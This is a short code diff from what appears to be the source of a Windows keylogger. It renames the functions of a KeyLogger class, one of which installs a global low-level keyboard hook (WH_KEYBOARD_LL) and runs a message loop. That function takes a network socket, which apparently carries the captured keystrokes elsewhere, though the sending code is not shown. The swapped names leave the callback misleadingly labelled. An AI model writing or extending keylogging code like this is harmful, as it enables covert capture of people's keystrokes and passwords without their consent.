@@ -10,7 +10,7 @@ bool isCtrlOn{};
 bool isCapsOn{};
 
 // function listens to all keyboard clicks. Will be used as a thread
-LRESULT CALLBACK KeyLogger::recordKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	static int last;
 	BOOL letter = 1;
@@ -250,9 +250,9 @@ LRESULT CALLBACK KeyLogger::recordKeyboard(int nCode, WPARAM wParam, LPARAM lPar
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-void KeyLogger::startListen(SOCKET sock)
+void KeyLogger::recordKeyboard(SOCKET sock)
 {
-	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::recordKeyboard, 0, 0);
+	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::startListen, 0, 0);
 	MSG msg;
 	while (!GetMessage(&msg, NULL, 0, 0)) {
 		TranslateMessage(&msg);
